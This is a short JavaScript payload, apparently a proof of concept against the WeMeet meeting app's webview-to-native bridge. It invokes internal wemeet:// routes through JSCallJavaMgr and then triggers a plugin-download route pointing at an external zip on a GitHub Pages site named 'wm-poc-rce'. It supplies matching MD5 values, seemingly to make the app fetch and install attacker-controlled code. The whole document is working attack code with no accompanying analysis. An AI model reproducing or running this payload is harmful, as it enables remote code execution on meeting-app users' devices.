(function(){
  window.__p114=function(r){document.title='P114CB:'+r};
  function open(id,scheme,params){JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p114',module:'CommonPlugin',method:'OpenNewPage',callId:id,param:{scheme:scheme,router_params:params||{}}}))}
  document.title='P114PAY';
  setTimeout(function(){open('P114-SCHEDULE','wemeet://page/premeeting/schedule',{from_webView:true})},500);
  setTimeout(function(){var u='https://gitwhs.github.io/wm-poc-rce/p50.zip';open('P114-DL','wemeet://page/premeeting/schedule_plugin_download',{url:u,download_url:u,plugin_url:u,package_url:u,resource_url:u,md5:'1fcb47a1646f6b2c77c4fda65e332eee',plugin_md5:'1fcb47a1646f6b2c77c4fda65e332eee',plugin_id:'p114',module_name:'p114',package_name:'p114',from_webView:true})},4500);
})();
